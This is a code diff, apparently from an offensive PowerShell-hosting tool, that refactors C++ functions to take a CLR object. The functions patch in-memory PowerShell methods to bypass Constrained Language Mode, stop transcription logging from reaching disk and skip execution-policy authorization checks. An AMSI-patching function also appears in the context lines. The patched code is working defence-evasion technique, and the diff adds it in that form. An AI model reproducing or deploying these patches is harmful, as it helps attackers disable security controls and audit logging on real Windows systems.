@@ -81,12 +81,12 @@ BOOL PatchAmsiScanBuffer()
 // Credit:
 //   - https://github.com/calebstewart/bypass-clm
 //
-BOOL PatchSystemPolicyGetSystemLockdownPolicy(_AppDomain* pAppDomain)
+BOOL PatchSystemPolicyGetSystemLockdownPolicy(CLR &clr)
 {
     BYTE bPatch[] = { 0x48, 0x31, 0xc0, 0xc3 }; // mov rax, 0; ret;
 
     return PatchManagedFunction(
-        pAppDomain,
+        clr,
         L"System.Management.Automation",
         L"System.Management.Automation.Security.SystemPolicy",
         L"GetSystemLockdownPolicy",
@@ -110,12 +110,12 @@ BOOL PatchSystemPolicyGetSystemLockdownPolicy(_AppDomain* pAppDomain)
 // Links:
 //   - https://github.com/PowerShell/PowerShell/blob/master/src/System.Management.Automation/engine/hostifaces/MshHostUserInterface.cs
 //
-BOOL PatchTranscriptionOptionFlushContentToDisk(_AppDomain* pAppDomain)
+BOOL PatchTranscriptionOptionFlushContentToDisk(CLR& clr)
 {
     BYTE bPatch[] = { 0xc3 }; // ret;
 
     return PatchManagedFunction(
-        pAppDomain,
+        clr,
         L"System.Management.Automation",
         L"System.Management.Automation.Host.TranscriptionOption",
         L"FlushContentToDisk",
@@ -144,12 +144,12 @@ BOOL PatchTranscriptionOptionFlushContentToDisk(_AppDomain* pAppDomain)
 // Links:
 //   - https://github.com/PowerShell/PowerShell/blob/master/src/System.Management.Automation/engine/SecurityManagerBase.cs
 //
-BOOL PatchAuthorizationManagerShouldRunInternal(_AppDomain* pAppDomain)
+BOOL PatchAuthorizationManagerShouldRunInternal(CLR& clr)
 {
     BYTE bPatch[] = { 0xc3 }; // ret;
 
     return PatchManagedFunction(
-        pAppDomain,
+        clr,
         L"System.Management.Automation",
         L"System.Management.Automation.AuthorizationManager",
         L"ShouldRunInternal",
@@ -230,11 +230,11 @@ BOOL PatchUnmanagedFunction(LPCWSTR pwszMdoduleName, LPCSTR pszProcedureName, LP
     return TRUE;
 }
 
-BOOL PatchManagedFunction(_AppDomain* pAppDomain, LPCWSTR pwszAssemblyName, LPCWSTR pwszClassName, LPCWSTR pwszMethodName, DWORD dwNbArgs, LPBYTE pbPatch, DWORD dwPatchSize, DWORD dwPatchOffset)
+BOOL PatchManagedFunction(CLR &clr, LPCWSTR pwszAssemblyName, LPCWSTR pwszClassName, LPCWSTR pwszMethodName, DWORD dwNbArgs, LPBYTE pbPatch, DWORD dwPatchSize, DWORD dwPatchOffset)
 {
     ULONG_PTR pMethodAddress = 0;
 
-    if (!clr.GetJustInTimeMethodAddress(pAppDomain, pwszAssemblyName, pwszClassName, pwszMethodName, dwNbArgs, &pMethodAddress))
+    if (!clr.GetJustInTimeMethodAddress(pwszAssemblyName, pwszClassName, pwszMethodName, dwNbArgs, &pMethodAddress))
         return FALSE;
 
     pMethodAddress += dwPatchOffset;
